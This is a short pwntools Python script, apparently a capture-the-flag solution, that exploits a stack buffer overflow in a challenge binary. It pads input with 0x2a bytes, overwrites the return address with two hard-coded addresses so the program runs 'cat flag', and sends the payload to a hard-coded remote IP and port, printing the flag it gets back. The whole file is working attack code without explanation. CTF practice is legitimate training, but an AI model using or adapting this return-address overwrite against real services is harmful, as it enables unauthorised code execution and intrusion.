#!/usr/bin/env python3

from pwn import *
import time
import traceback

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-w']

def slar(p, recv_msg, send_msg):
    p.recvuntil(recv_msg)
    p.sendline(send_msg)

def sar(p, recv_msg, send_msg):
    p.recvuntil(recv_msg)
    p.send(send_msg)

def rn(p, n):
    return p.recvn(n)

def ru(p, recv_msg):
    return p.recvuntil(recv_msg)

def do_exp(p):
    p=remote(host, port)

    slar(p, 'please tell me your name', 'cat flag')
    payload = b'b'*0x2a + p32(0x0804855A) + p32(0x0804A080)
    slar(p, 'hello,you can leave some message here:', payload)
    
    ru(p, '\n')
    flag = ru(p, '\n')
    print(flag)
    #print(p.recv())
    #p.interactive()
    return flag

def exp(host='', port=''):
    if host and port:
        p = remote(host, port)
    else:
        p = process(['./53c24fc5522e4a8ea2d9ad0577196b2f'])
    do_exp(p)

if __name__ == "__main__":
    host = '220.249.52.133'
    port = 30676
    remote_addr = '220.249.52.133:54795'
    host, port = remote_addr.split(':')
    exp(host, port)
